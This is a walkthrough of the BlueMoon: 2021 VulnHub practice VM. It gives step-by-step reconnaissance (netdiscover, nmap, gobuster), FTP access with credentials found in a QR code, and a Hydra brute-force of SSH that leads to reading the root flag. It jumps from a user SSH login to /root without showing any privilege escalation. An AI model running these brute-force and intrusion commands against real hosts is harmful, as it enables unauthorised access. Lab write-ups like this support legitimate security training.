# BlueMoon: 2021 VulnHub Walkthrough

![VulnHub](https://img.shields.io/badge/VulnHub-BlueMoon-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner-green)
![Lab Type](https://img.shields.io/badge/Lab-Boot2Root-orange)

---

## Overview

This repository documents a penetration testing lab on **BlueMoon: 2021** VulnHub VM.  
Objective: discover vulnerabilities, exploit them, and obtain root access.

- Difficulty: Beginner  
- Platform: VulnHub  

---

## Tools Used

- Kali Linux
- Netdiscover
- Nmap
- Gobuster
- Dirb
- Hydra

---

## Step 1: Identify Attacker IP

Command:

```bash
ifconfig 
```

Result:
```bash
192.168.0.75 
```

Screenshot: screenshots/attacker-ip.png


## Step 2: Discover Hosts in Network

Command:

```bash
sudo netdiscover
```

Result:
```bash
192.168.0.65  Target
```

Screenshot: screenshots/netdiscover.png


## Step 3: Scan Network for Active Hosts

Command:

```bash
nmap -sn 192.168.0.0/24
```

Result:
```bash
Host is up: 192.168.0.65
```

Screenshot: screenshots/nmap-host.png


## Step 4: Detailed Port Scan
Command:

```bash
nmap -sC -sV -Pn -vv 192.168.0.65
```

Result:
```bash
21/tcp open ftp
22/tcp open ssh
80/tcp open http
```

Screenshot: screenshots/nmap-port.png

## Step 5: Directory Enumeration
Command:

```bash
gobuster dir -u http://192.168.0.65 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Result:
```bash
/hidden_text
```

Screenshot: screenshots/gobuster.png


## Step 6: Visit Website
Open browser and go to:

```bash
http://192.168.0.65
```

Screenshot: screenshots/website.png


## Step 7: Check Hidden Directory
Navigate to:

```bash
[http://192.168.0.65](http://192.168.0.65/hidden_text)
```

Screenshot: screenshots/hidden_text.png


## Step 8: Decode QR Code
The page contains a QR code that reveals:

```bash
Username
Password
```

Screenshot: screenshots/qrcode.png


## Step 9: Access FTP
Command:

```bash
ftp 192.168.0.65
```
Login using the credentials obtained.
Screenshot: screenshots/ftp-login.png


## Step 10: Read Information File
Command:

```bash
cat information.txt
```
Screenshot: screenshots/information.png


## Step 11: Read Password List
Command:

```bash
cat p_lists.txt
```
Screenshot: screenshots/passwordlist.png


## Step 12: Brute Force SSH Using Hydra
Command:

```bash
hydra -l robin -P p_lists.txt ssh://192.168.0.65
```
Screenshot: screenshots/hydra.png


## Step 13: SSH Access
Command:

```bash
ssh robin@192.168.0.65
```
Screenshot: screenshots/ssh-login.png


## Step 14: Capture Root
Command:

```bash
cd /root
cat root.txt
```
Screenshot: screenshots/root.png


Conclusion

- Successfully performed:
- Network discovery
- Port scanning
- Web enumeration
- Credential extraction
- SSH brute force
- Root access obtained
